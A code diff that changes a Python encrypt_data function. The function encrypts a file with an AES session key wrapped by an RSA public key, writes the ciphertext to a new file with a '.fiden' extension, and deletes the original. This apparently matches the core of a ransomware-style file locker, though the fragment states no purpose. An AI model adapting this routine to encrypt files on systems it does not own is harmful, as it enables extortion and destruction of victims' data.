@@ -7,10 +7,9 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 def encrypt_data(path,file_name,session_key,recipient_key):
     if(os.path.exists(path) == True and os.path.isfile(path+'/'+file_name) == True):
         # open the file that been encrypt
-        rename_str = path+'/'+file_name+".temp"
-        os.rename(path+'/'+file_name,rename_str)
-        file_source = open(rename_str, "rb")
-        file_out = open(path+'/'+file_name, "wb")
+        rename_str = path+'/'+file_name+".fiden"
+        file_source = open(path+'/'+file_name, "rb")
+        file_out = open(rename_str, "wb")
         data = file_source.read()
         # Encrypt the session key with the public RSA key
         cipher_rsa = PKCS1_OAEP.new(recipient_key)
@@ -22,7 +21,7 @@ def encrypt_data(path,file_name,session_key,recipient_key):
         [ file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext) ]
         file_out.close()
         file_source.close()
-        os.remove(rename_str)
+        os.remove(path+'/'+file_name)
         
 def get_session_key():
     session_key = get_random_bytes(16)
